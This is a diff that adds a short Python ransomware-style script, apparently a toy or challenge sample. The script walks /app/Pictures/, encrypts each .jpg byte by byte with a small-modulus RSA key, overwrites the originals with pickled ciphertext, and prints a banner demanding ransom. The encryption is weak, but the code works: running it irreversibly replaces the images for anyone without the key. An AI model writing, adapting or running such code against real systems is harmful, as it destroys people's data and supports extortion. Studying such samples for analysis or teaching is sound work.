@@ -1,0 +1,25 @@
+#!/usr/bin/python3
+import pickle
+import os
+
+n = 22291846172619859445381409012451
+e = 65535
+
+base='/app/Pictures/'
+
+for filename in os.listdir(base):
+    if filename.endswith(".jpg"):
+        plain_bytes = b''
+        with open(base+filename, 'rb') as f:
+            plain_bytes = f.read()
+        cipher_int = [pow(i, e, n) for i in plain_bytes]
+        with open(base+filename, 'wb') as f:
+            pickle.dump(cipher_int, f)
+
+text = """\
+//////////////////////////////////////////////////////////////////////
+//////////////////////          ERROR!!!!!         ///////////////////
+//////////////////         Give me ransom haha!      /////////////////
+//////////////////////////////////////////////////////////////////////
+"""
+print(text)
